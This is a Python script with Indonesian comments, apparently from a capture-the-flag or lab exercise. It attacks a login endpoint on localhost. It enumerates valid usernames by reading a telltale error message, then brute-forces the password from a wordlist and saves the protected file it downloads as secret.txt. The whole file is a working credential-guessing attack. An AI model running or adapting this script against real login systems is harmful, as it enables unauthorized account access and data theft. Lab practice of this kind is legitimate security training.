import requests

# URL endpoint login
url = "http://localhost:5000/login"

# Default password yang diketahui
default_password = "default"

# File wordlist
wordlist_file = "wordlist.txt"

# Fungsi untuk melakukan brute force username
def bruteforce_username():
    with open(wordlist_file, "r") as file:
        for line in file:
            username = line.strip()  # Baca username dari wordlist
            response = requests.post(url, data={'username': username, 'password': default_password})

            # Cek jika username benar tapi password salah
            if "username benar, password salah" in response.text:
                print(f"[+] Username ditemukan: {username}")
                return username  # Return username yang benar
            else:
                print(f"[-] Username salah: {username}")

    return None  # Jika tidak ada username yang ditemukan

# Fungsi untuk melakukan brute force password
def bruteforce_password(correct_username):
    with open(wordlist_file, "r") as file:
        for line in file:
            password = line.strip()  # Baca password dari wordlist
            response = requests.post(url, data={'username': correct_username, 'password': password})

            # Cek jika keduanya benar
            if response.headers.get('Content-Disposition'):
                print(f"[+] Password ditemukan: {password}")
                # Simpan file yang didapatkan
                with open("secret.txt", "wb") as f:
                    f.write(response.content)
                print("[+] File 'secret.txt' berhasil diunduh.")
                return True
            else:
                print(f"[-] Password salah: {password}")

    return False  # Jika password tidak ditemukan

if __name__ == "__main__":
    print("[*] Memulai brute force username...")

    # Coba brute force username
    correct_username = bruteforce_username()

    if correct_username:
        print(f"[+] Username yang benar adalah: {correct_username}")
        print("[*] Memulai brute force password...")
        # Jika username ditemukan, lanjutkan ke brute force password
        bruteforce_password(correct_username)
    else:
        print("[-] Tidak ada username yang benar ditemukan.")
